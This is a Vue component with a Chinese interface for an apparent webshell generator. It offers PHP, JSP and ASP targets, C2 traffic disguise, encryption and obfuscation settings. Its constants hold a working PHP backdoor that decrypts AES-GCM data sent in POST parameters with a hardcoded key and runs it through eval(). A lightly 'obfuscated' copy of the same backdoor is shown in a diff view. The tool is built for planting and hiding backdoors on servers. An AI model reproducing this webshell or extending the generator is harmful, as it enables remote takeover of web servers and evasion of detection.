<template>
  <div class="payload-view">

    <!-- ═══ LEFT CONFIG PANEL (340px) ═══ -->
    <div class="config-panel">

      <!-- Name row — pinned top -->
      <div class="name-row">
        <n-input
          v-model:value="payloadName"
          placeholder="载荷名称（可选）"
          size="small"
          style="flex:1;font-size:12px"
        />
        <n-button size="small" style="flex-shrink:0">
          <template #icon><Save :size="13" /></template>
          保存
        </n-button>
      </div>

      <!-- Scrollable config body -->
      <div class="config-body">

        <!-- Language -->
        <div class="config-section">
          <label class="field-label">语言</label>
          <div class="radio-tabs">
            <button
              v-for="l in langs"
              :key="l"
              class="radio-tab"
              :class="{ 'is-active': lang === l }"
              @click="lang = l"
            >{{ l }}</button>
          </div>
        </div>

        <!-- Target Version (PHP only) -->
        <div v-if="lang === 'PHP'" class="config-section">
          <label class="field-label">目标版本</label>
          <div class="radio-tabs">
            <button
              v-for="v in phpVersions"
              :key="v"
              class="radio-tab"
              :class="{ 'is-active': targetVersion === v }"
              @click="targetVersion = v"
            >{{ v }}</button>
          </div>
        </div>

        <!-- C2 Profile -->
        <div class="config-section">
          <label class="field-label">C2 Profile</label>
          <n-select
            v-model:value="c2Profile"
            :options="c2ProfileOptions"
            size="small"
          />
          <span class="field-hint">控制请求参数名、User-Agent、时序抖动</span>
        </div>

        <!-- Encryption -->
        <div class="config-section">
          <label class="field-label">加密方式</label>
          <div class="enc-options">
            <label
              v-for="opt in encOptions"
              :key="opt.value"
              class="enc-option"
              :class="{ 'is-active': encMode === opt.value }"
              @click="encMode = opt.value"
            >
              <div class="radio-circle">
                <div v-if="encMode === opt.value" class="radio-dot" />
              </div>
              <span class="enc-name">{{ opt.label }}</span>
              <span class="enc-tag" :class="opt.tagClass">{{ opt.tag }}</span>
            </label>
          </div>
        </div>

        <!-- Key -->
        <div class="config-section">
          <label class="field-label">密钥</label>
          <div class="key-row">
            <n-input
              v-model:value="keyValue"
              :type="showKey ? 'text' : 'password'"
              placeholder="输入密钥"
              size="small"
              class="key-input"
            />
            <button
              class="icon-btn"
              :aria-label="showKey ? '隐藏密码' : '显示密码'"
              @click="showKey = !showKey"
            >
              <EyeOff v-if="showKey" :size="14" />
              <Eye v-else :size="14" />
            </button>
            <button
              class="icon-btn"
              aria-label="复制密钥"
              @click="copyKey"
            >
              <Check v-if="keyCopied" :size="14" class="icon-success" />
              <Copy v-else :size="14" />
            </button>
          </div>
          <!-- Strength bar -->
          <div class="strength-bar">
            <div
              v-for="i in 4"
              :key="i"
              class="strength-seg"
              :style="{ background: strengthSegColor(keyStrength, i) }"
            />
          </div>
          <span v-if="keyValue" class="strength-label" :class="strengthClass">
            强度：{{ strengthText }}
          </span>
        </div>

        <!-- Obfuscation -->
        <div class="config-section">
          <label class="field-label">混淆等级</label>
          <div class="slider-row">
            <n-slider v-model:value="obfLevel" :min="0" :max="5" :step="1" style="flex:1" />
            <span class="level-badge">L{{ obfLevel }}</span>
          </div>
          <div class="obf-checks">
            <label class="obf-check" :class="{ 'is-disabled': obfLevel === 0 }">
              <n-checkbox v-model:checked="obfVarRename" :disabled="obfLevel === 0" />
              <span>变量重命名</span>
            </label>
            <label class="obf-check" :class="{ 'is-disabled': obfLevel === 0 }">
              <n-checkbox v-model:checked="obfStrEncrypt" :disabled="obfLevel === 0" />
              <span>字符串加密</span>
            </label>
            <label class="obf-check" :class="{ 'is-disabled': obfLevel === 0 }">
              <n-checkbox v-model:checked="obfJunk" :disabled="obfLevel === 0" />
              <span>垃圾代码注入</span>
            </label>
          </div>
        </div>

      </div><!-- /config-body -->

      <!-- Generate button — pinned bottom -->
      <div class="gen-row">
        <button
          class="gen-btn"
          :class="{ 'is-loading': generating, 'is-success': genSuccess, 'is-error': generateError }"
          :disabled="generating"
          @click="generate"
        >
          <Loader2 v-if="generating" :size="15" class="spin" />
          <Check v-else-if="genSuccess" :size="15" />
          <Zap v-else :size="15" />
          <span>{{ genBtnLabel }}</span>
        </button>
      </div>

    </div><!-- /config-panel -->

    <!-- ═══ RIGHT CODE PANEL ═══ -->
    <div class="code-panel">

      <!-- Toolbar -->
      <div class="code-toolbar">
        <span class="code-filename">{{ codeFilename }}</span>
        <button
          class="tool-btn diff-btn"
          :class="{ 'is-active': showDiff }"
          title="混淆对比视图"
          @click="showDiff = !showDiff"
        >
          <Columns2 :size="13" />
          <span>对比</span>
        </button>
        <button class="tool-btn" title="复制代码" @click="copyCode">
          <Check v-if="codeCopied" :size="13" class="icon-success" />
          <Copy v-else :size="13" />
        </button>
        <button class="tool-btn" title="下载">
          <Download :size="13" />
        </button>
      </div>

      <!-- Single code view -->
      <div v-if="!showDiff" class="code-with-nums">
        <div class="line-nums" aria-hidden="true">
          <span v-for="n in lineCount" :key="n">{{ n }}</span>
        </div>
        <div class="code-body" v-html="highlightedCode" />
      </div>

      <!-- Diff view -->
      <div v-else class="diff-view">
        <div class="diff-col">
          <div class="diff-hdr">
            <FileText :size="12" />
            <span>原始代码</span>
          </div>
          <div class="code-body diff-code" v-html="originalCode" />
        </div>
        <div class="diff-col">
          <div class="diff-hdr obf">
            <Shield :size="12" />
            <span>混淆后 (L{{ obfLevel }})</span>
          </div>
          <div class="code-body diff-code" v-html="highlightedCode" />
        </div>
      </div>

      <!-- Status bar -->
      <div class="code-status">
        <span>{{ codeStatusText }}</span>
      </div>

    </div><!-- /code-panel -->

  </div>
</template>

<script setup lang="ts">
import { ref, computed } from 'vue'
import {
  Eye, EyeOff, Copy, Check, Download,
  Save, Zap, Loader2, Columns2, FileText, Shield,
} from 'lucide-vue-next'

// ─── Constants (must precede refs that reference them) ────────────────────────

const ORIGINAL_CODE = `<?php
$key="myS3cr3tK3y!";
$iv=base64_decode($_POST["v"]);
$tag=base64_decode($_POST["t"]);
$data=openssl_decrypt(
  base64_decode($_POST["d"]),
  "aes-256-gcm",$key,
  OPENSSL_RAW_DATA,$iv,$tag
);
if($data!==false){
  eval($data);
}
?>`

const PLACEHOLDER_CODE = `<?php
// AES-256-GCM · L2 obfuscation
$_O0O0=base64_decode('bXlTM2NyM3RLM3kh');
$_iv=base64_decode($_POST["v"]);
$_tag=base64_decode($_POST["t"]);
$_d=openssl_decrypt(
  base64_decode($_POST["d"]),
  "aes-256-gcm",$_O0O0,
  OPENSSL_RAW_DATA,$_iv,$_tag
);
if($_d!==false){
  eval($_d);
}
?>`

// ─── State ────────────────────────────────────────────────────────────────────

const payloadName   = ref('')
const lang          = ref<'PHP' | 'JSP' | 'ASP' | 'ASPX'>('PHP')
const targetVersion = ref('5.x+')
const c2Profile     = ref('default')
const encMode       = ref<'aes' | 'xor' | 'none'>('aes')
const keyValue      = ref('')
const showKey       = ref(false)
const keyCopied     = ref(false)
const obfLevel      = ref(2)
const obfVarRename  = ref(true)
const obfStrEncrypt = ref(true)
const obfJunk       = ref(false)
const generating    = ref(false)
const genSuccess    = ref(false)
const generateError = ref(false)
const codeOutput    = ref(PLACEHOLDER_CODE)
const codeCopied    = ref(false)
const showDiff      = ref(false)

// ─── Options ──────────────────────────────────────────────────────────────────

const langs       = ['PHP', 'JSP', 'ASP', 'ASPX'] as const
const phpVersions = ['5.x+', '7.4+', '8.x'] as const

const c2ProfileOptions = [
  { label: '默认 (Default)',  value: 'default' },
  { label: '拟态 Web 流量',   value: 'web'     },
  { label: 'CDN 流量伪装',    value: 'cdn'     },
  { label: '自定义...',       value: 'custom'  },
]

const encOptions: Array<{ value: 'aes' | 'xor' | 'none'; label: string; tag: string; tagClass: string }> = [
  { value: 'aes',  label: 'AES-256-GCM', tag: '推荐',  tagClass: 'tag-rec'    },
  { value: 'xor',  label: 'XOR',         tag: '兼容',  tagClass: 'tag-compat' },
  { value: 'none', label: '无加密',       tag: '不推荐', tagClass: 'tag-warn'  },
]

// ─── Computed ─────────────────────────────────────────────────────────────────

const keyStrength = computed(() => {
  const k = keyValue.value
  if (!k.length) return 0
  if (k.length < 8) return 1
  if (k.length < 16) return 2
  const hasNum = /\d/.test(k)
  const hasSym = /[^a-zA-Z0-9]/.test(k)
  return hasNum && hasSym ? 4 : 3
})

const strengthText  = computed(() => ['', '弱', '一般', '中等', '强'][keyStrength.value] ?? '')
const strengthClass = computed(() => ['', 'st-weak', 'st-fair', 'st-medium', 'st-strong'][keyStrength.value] ?? '')

function strengthSegColor(strength: number, seg: number): string {
  if (strength < seg) return 'var(--bg-hover)'
  if (strength === 1) return '#f87171'
  if (strength === 2) return '#fb923c'
  if (strength === 3) return '#fbbf24'
  return '#4ade80'
}

const lineCount = computed(() => {
  const lines = codeOutput.value.split('\n').length
  return Array.from({ length: lines }, (_, i) => i + 1)
})

const highlightedCode = computed(() => syntaxHighlight(codeOutput.value))
const originalCode    = computed(() => syntaxHighlight(ORIGINAL_CODE))

const codeFilename = computed(() => {
  const ext = lang.value.toLowerCase()
  return `payload.${ext} · ${(codeOutput.value.length / 1024).toFixed(1)} KB`
})

const encLabel: Record<string, string> = { aes: 'AES-256-GCM', xor: 'XOR', none: '无加密' }
const codeStatusText = computed(() => {
  const ver = lang.value === 'PHP' ? ` ${targetVersion.value}` : ''
  return `${lang.value}${ver} · ${encLabel[encMode.value]} · 混淆 L${obfLevel.value} · ${(codeOutput.value.length / 1024).toFixed(1)} KB`
})

const genBtnLabel = computed(() => {
  if (generating.value) return '生成中…'
  if (genSuccess.value) return '已生成'
  if (generateError.value) return '生成失败'
  return '生成载荷'
})

// ─── Actions ──────────────────────────────────────────────────────────────────

async function copyKey() {
  if (!keyValue.value) return
  await navigator.clipboard.writeText(keyValue.value)
  keyCopied.value = true
  setTimeout(() => (keyCopied.value = false), 1500)
}

async function copyCode() {
  await navigator.clipboard.writeText(codeOutput.value)
  codeCopied.value = true
  setTimeout(() => (codeCopied.value = false), 1500)
}

async function generate() {
  if (generating.value) return
  generating.value = true
  generateError.value = false
  genSuccess.value = false
  try {
    await new Promise(r => setTimeout(r, 900))
    codeOutput.value = PLACEHOLDER_CODE
    genSuccess.value = true
    setTimeout(() => (genSuccess.value = false), 2000)
  } catch {
    generateError.value = true
    setTimeout(() => (generateError.value = false), 3000)
  } finally {
    generating.value = false
  }
}

// ─── Syntax highlight (minimal PHP/JSP tokenizer) ─────────────────────────────

function syntaxHighlight(code: string): string {
  return code
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/(\/\/[^\n]*)/g, '<span class="c-comment">$1</span>')
    .replace(/("(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*')/g, '<span class="c-str">$1</span>')
    .replace(/\b(if|else|while|for|foreach|function|return|echo|eval|class|new|true|false|null|isset|empty)\b/g, '<span class="c-kw">$1</span>')
    .replace(/(\$\w+)/g, '<span class="c-var">$1</span>')
    .replace(/\b(\w+)\s*(?=\()/g, (m, fn) =>
      ['if', 'else', 'while', 'for', 'foreach', 'function', 'class', 'new', 'return'].includes(fn)
        ? m
        : `<span class="c-fn">${fn}</span>(`)
    .replace(/(&lt;\?php|&lt;\?|\?&gt;)/g, '<span class="c-tag">$1</span>')
}

</script>

<style scoped>
/* ─── Shell ───────────────────────────────────────────────────────────────── */
.payload-view {
  height: 100%;
  display: flex;
  overflow: hidden;
}

/* ─── Left config panel ───────────────────────────────────────────────────── */
.config-panel {
  width: 340px;
  flex-shrink: 0;
  border-right: 1px solid var(--border);
  display: flex;
  flex-direction: column;
  overflow: hidden;
}

/* Name row — pinned top */
.name-row {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 10px 16px;
  border-bottom: 1px solid var(--border);
  flex-shrink: 0;
}

/* Config body — scrollable */
.config-body {
  flex: 1;
  overflow-y: auto;
  padding: 14px 16px;
  display: flex;
  flex-direction: column;
  gap: 16px;
}

/* Generate row — pinned bottom */
.gen-row {
  padding: 12px 16px;
  border-top: 1px solid var(--border);
  flex-shrink: 0;
}

/* ─── Config sections ─────────────────────────────────────────────────────── */
.config-section {
  display: flex;
  flex-direction: column;
  gap: 6px;
}

.field-label {
  font-size: 11px;
  font-weight: 500;
  color: var(--text-2);
  text-transform: uppercase;
  letter-spacing: 0.05em;
}

.field-hint {
  font-size: 11px;
  color: var(--text-3);
  line-height: 1.4;
}

/* Radio tabs (language / version) */
.radio-tabs {
  display: flex;
  gap: 4px;
}

.radio-tab {
  flex: 1;
  height: 30px;
  background: var(--bg-hover);
  border: 1px solid var(--border);
  border-radius: 4px;
  color: var(--text-2);
  font-size: 12px;
  cursor: pointer;
  transition: background 80ms, color 80ms, border-color 80ms;
}

.radio-tab:hover {
  background: var(--bg-elevated);
  color: var(--text-1);
}

.radio-tab.is-active {
  background: var(--accent);
  border-color: var(--accent);
  color: #fff;
  font-weight: 500;
}

/* Encryption options */
.enc-options {
  display: flex;
  flex-direction: column;
  gap: 4px;
}

.enc-option {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 7px 10px;
  border-radius: 5px;
  border: 1px solid transparent;
  cursor: pointer;
  transition: background 80ms, border-color 80ms;
}

.enc-option:hover { background: var(--bg-hover); }

.enc-option.is-active {
  background: var(--bg-elevated);
  border-color: var(--border);
}

.radio-circle {
  width: 14px;
  height: 14px;
  border-radius: 50%;
  border: 1.5px solid var(--text-3);
  flex-shrink: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: border-color 100ms;
}

.enc-option.is-active .radio-circle {
  border-color: var(--accent);
}

.radio-dot {
  width: 6px;
  height: 6px;
  border-radius: 50%;
  background: var(--accent);
}

.enc-name {
  flex: 1;
  font-size: 12px;
  color: var(--text-1);
  font-family: var(--font-mono);
}

.enc-tag {
  font-size: 10px;
  padding: 1px 6px;
  border-radius: 3px;
  font-weight: 500;
}

.tag-rec    { background: rgba(74,222,128,0.12);  color: #4ade80; }
.tag-compat { background: rgba(251,191,36,0.12);  color: #fbbf24; }
.tag-warn   { background: rgba(248,113,113,0.12); color: #f87171; }

/* Key row */
.key-row {
  display: flex;
  align-items: center;
  gap: 4px;
}

.key-input { flex: 1; font-family: var(--font-mono) !important; }

.icon-btn {
  width: 28px;
  height: 28px;
  display: flex;
  align-items: center;
  justify-content: center;
  background: transparent;
  border: none;
  color: var(--text-3);
  cursor: pointer;
  border-radius: 4px;
  flex-shrink: 0;
  transition: background 80ms, color 80ms;
}

.icon-btn:hover { background: var(--bg-hover); color: var(--text-1); }

.icon-success { color: var(--color-success); }

/* Strength */
.strength-bar {
  display: flex;
  gap: 3px;
  height: 3px;
  margin-top: 4px;
}

.strength-seg {
  flex: 1;
  border-radius: 2px;
  background: var(--bg-hover);
  transition: background 200ms;
}

.strength-label {
  font-size: 11px;
  margin-top: 2px;
}

.st-weak   { color: #f87171; }
.st-fair   { color: #fb923c; }
.st-medium { color: #fbbf24; }
.st-strong { color: #4ade80; }

/* Slider row */
.slider-row {
  display: flex;
  align-items: center;
  gap: 10px;
}

.level-badge {
  min-width: 28px;
  text-align: center;
  background: var(--accent-bg);
  color: var(--accent);
  font-family: var(--font-mono);
  font-size: 12px;
  padding: 2px 6px;
  border-radius: 4px;
  flex-shrink: 0;
}

.obf-checks { display: flex; flex-direction: column; gap: 6px; padding-top: 4px; }

.obf-check {
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 12px;
  color: var(--text-2);
  cursor: pointer;
  user-select: none;
}

.obf-check.is-disabled { opacity: 0.38; cursor: not-allowed; }

/* Generate button */
.gen-btn {
  width: 100%;
  height: 40px;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  background: var(--accent);
  border: none;
  border-radius: 6px;
  color: #fff;
  font-size: 14px;
  font-weight: 500;
  cursor: pointer;
  transition: filter 100ms, background 200ms, border-color 200ms;
}

.gen-btn:not(:disabled):hover { filter: brightness(1.1); }
.gen-btn:disabled { cursor: not-allowed; opacity: 0.7; }

.gen-btn.is-success { background: var(--color-success); }
.gen-btn.is-error {
  background: transparent;
  border: 1px solid var(--color-error);
  color: var(--color-error);
}

.spin {
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

/* ─── Right code panel ────────────────────────────────────────────────────── */
.code-panel {
  flex: 1;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  background: var(--code-bg);
  border-left: 1px solid var(--code-border);
  margin: 12px;
  border-radius: 6px;
  border: 1px solid var(--code-border);
  box-shadow: 0 2px 8px rgba(0,0,0,0.18);
}

/* Toolbar */
.code-toolbar {
  display: flex;
  align-items: center;
  gap: 4px;
  padding: 0 10px;
  height: 36px;
  flex-shrink: 0;
  border-bottom: 1px solid var(--code-border);
  background: #0f1016;
}

.code-filename {
  flex: 1;
  font-size: 11px;
  color: var(--text-3);
  font-family: var(--font-mono);
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}

.tool-btn {
  display: flex;
  align-items: center;
  gap: 4px;
  height: 26px;
  padding: 0 8px;
  background: transparent;
  border: 1px solid transparent;
  border-radius: 4px;
  color: var(--text-3);
  font-size: 11px;
  cursor: pointer;
  transition: background 80ms, color 80ms, border-color 80ms;
  white-space: nowrap;
}

.tool-btn:hover { background: rgba(255,255,255,0.06); color: var(--text-1); }

.diff-btn.is-active {
  background: var(--accent-bg);
  border-color: var(--accent);
  color: var(--accent);
}

/* Single code view */
.code-with-nums {
  flex: 1;
  display: flex;
  overflow: auto;
  padding: 12px 0;
}

.line-nums {
  display: flex;
  flex-direction: column;
  align-items: flex-end;
  padding: 0 12px;
  min-width: 44px;
  font-family: var(--font-mono);
  font-size: 12px;
  line-height: 1.6;
  color: #3e4151;
  user-select: none;
  border-right: 1px solid var(--code-border);
  flex-shrink: 0;
}

.code-body {
  flex: 1;
  padding: 0 16px;
  font-family: var(--font-mono);
  font-size: 13px;
  line-height: 1.6;
  color: #abb2bf;
  overflow: auto;
  white-space: pre;
}

/* Diff view */
.diff-view {
  flex: 1;
  display: flex;
  overflow: hidden;
}

.diff-col {
  flex: 1;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  border-right: 1px solid var(--code-border);
}

.diff-col:last-child { border-right: none; }

.diff-hdr {
  display: flex;
  align-items: center;
  gap: 6px;
  padding: 6px 12px;
  font-size: 11px;
  color: var(--text-3);
  border-bottom: 1px solid var(--code-border);
  background: #0f1016;
  flex-shrink: 0;
}

.diff-hdr.obf { color: var(--accent); }

.diff-code { overflow: auto; padding: 12px 16px; }

/* Code status bar */
.code-status {
  padding: 5px 12px;
  font-size: 11px;
  color: var(--text-3);
  border-top: 1px solid var(--code-border);
  text-align: right;
  font-family: var(--font-mono);
  background: #0f1016;
  flex-shrink: 0;
}

/* ─── Syntax highlighting tokens ──────────────────────────────────────────── */
:deep(.c-kw)      { color: #c678dd; }
:deep(.c-str)     { color: #98c379; }
:deep(.c-var)     { color: #e06c75; }
:deep(.c-fn)      { color: #61afef; }
:deep(.c-comment) { color: #5c6370; font-style: italic; }
:deep(.c-tag)     { color: #e5c07b; font-weight: 600; }
</style>
